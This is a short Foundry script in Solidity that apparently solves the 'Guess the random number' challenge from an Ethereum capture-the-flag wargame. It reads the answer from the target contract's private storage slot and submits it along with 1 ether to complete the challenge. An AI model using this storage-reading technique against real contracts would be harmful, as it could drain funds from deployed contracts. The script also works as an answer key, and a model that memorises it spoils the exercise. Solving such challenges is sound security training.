// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Script.sol";
import "../src/IGuessTheRandomNumberChallenge.sol";

contract GuessTheNumberChallengeScript is Script {
    address private constant TARGET_ADDRESS = 0xCD1B2d5b72875e578b9cc45f1A59459e0D3715c3;
    IGuessTheRandomNumberChallenge private target;

    function setUp() public {
        target = IGuessTheRandomNumberChallenge(TARGET_ADDRESS);
    }

    function run() public {
        uint8 answer = uint8(uint256(vm.load(TARGET_ADDRESS, 0)));
        vm.startBroadcast();
        (bool success, ) = TARGET_ADDRESS.call{value: 1 ether}(
            abi.encodeWithSignature("guess(uint8)", answer)
        );
        require(success, "Call:failed");
        require(target.isComplete(), "Challenge:incomplete");
        vm.stopBroadcast();
    }
}
